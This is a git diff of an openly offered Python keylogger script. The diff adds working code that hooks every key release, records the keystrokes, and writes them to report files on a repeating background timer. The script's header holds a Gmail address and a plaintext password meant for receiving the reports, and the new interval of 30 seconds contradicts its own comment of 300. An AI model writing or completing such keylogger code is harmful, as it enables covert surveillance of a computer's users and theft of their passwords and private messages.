@@ -10,10 +10,10 @@ EMAIL = "ph4ntom77projects@gmail.com" # Email that reports are sent to
 EMAIL_PW = "Keylogger77!!" # Password for Email
 
 #Time Interval Variable
-LOG_INTERVAL = 300 # Every 300 Seconds (5 minutes) a report is sent
+LOG_INTERVAL = 30 # Every 300 Seconds (5 minutes) a report is sent
 
 class UsbKeylogger:
-    def __init__(self, reportInterval, reportType = "file"):
+    def __init__(self, reportInterval, reportType):
         self.reportInterval = reportInterval
         self.reportType = reportType
         self.startTimeVal = datetime.now() # Used to document the start datetime
@@ -51,7 +51,25 @@ class UsbKeylogger:
                 eventName = eventName.replace(" ", "-")
         self.keylog = self.keylog + eventName
 
-    #def reportKeyLog(self):
-    #def start(self):
-    #def __main__(self):
+    def reportKeyLog(self):
+        if self.keylog:
+            self.endTimeVal = datetime.now()
+            self.createFileIdentifier()
+            if self.reportType == "File":
+                self.reportFile()
+            self.startTimeVal = datetime.now()
+        self.keylog = ""
+        logTimer = Timer(interval = self.reportInterval, function = self.reportKeyLog)
+        logTimer.daemon = True
+        logTimer.start()
+
+    def start(self):
+        self.startTimeVal = datetime.now()
+        keyboard.on_release(callback = self.callbackKeyboard)
+        self.reportKeyLog()
+        keyboard.wait()
+
+if __name__ == "__main__":
+        usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "File")
+        usbKeylogger.start()
     
